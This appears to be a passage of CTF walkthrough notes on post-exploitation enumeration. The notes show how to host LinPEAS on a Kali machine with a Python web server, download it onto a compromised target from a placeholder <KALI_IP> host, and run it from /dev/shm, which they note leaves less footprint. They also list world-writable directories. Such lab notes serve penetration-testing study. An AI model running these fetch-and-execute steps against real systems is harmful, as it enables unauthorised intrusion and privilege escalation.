### Step 1: Locate LinPEAS on Kali

On most Kali installs, LinPEAS is already there. Open a **new terminal tab** on your Kali (don't close your SSH session!) and find it:

```sh
ls /usr/share/peass/linpeas/linpeas.sh
```

_If you don't have it, download it to your Kali first:_ 
`wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh`

### Step 2: Host the file (On Kali)

In the folder where `linpeas.sh` is located, start a temporary web server:

```sh
python3 -m http.server 80
```

_Your Kali is now acting like a website hosting that script._

### Step 3: Download and Run (On the Target/James)

Switch back to your **SSH window** (where you are James) and use `wget` or `curl` to grab the file from your Kali IP.

``` sh
# 1. Move to a folder where you have 'write' permissions
cd /dev/shm

# 2. Download from your Kali IP (Replace <KALI_IP> with your Tun0 IP)
wget http://<KALI_IP>/linpeas.sh

# 3. Give it permission to run
chmod +x linpeas.sh

# 4. Run it!
./linpeas.sh
```

---
### 💡 Why `/dev/shm`?

In many CTFs, you might not have permission to download files into the user's home folder. `/dev/shm` is a "shared memory" folder that is almost always **writable** and exists in RAM, meaning it's fast and leaves less of a footprint on the hard drive.

### The "Search Command"

If you want to find **every** folder on the system that is "World Writable" (meaning anyone can write to it), run this command:

``` sh
find / -writable -type d 2>/dev/null
```

**Breakdown of that command:**

- `find /`: Look everywhere starting from the root.
    
- `-writable`: Only show things I have permission to write to.
    
- `-type d`: Look for **Directories** (folders), not individual files.
    
- `2>/dev/null`: This is the most important part! It hides all the "Permission Denied" errors so your screen doesn't get cluttered.
### How to verify you can write

``` bash
ls -dl
drwxrwxrwt 2 root root 40 Feb 19 21:52 .
```

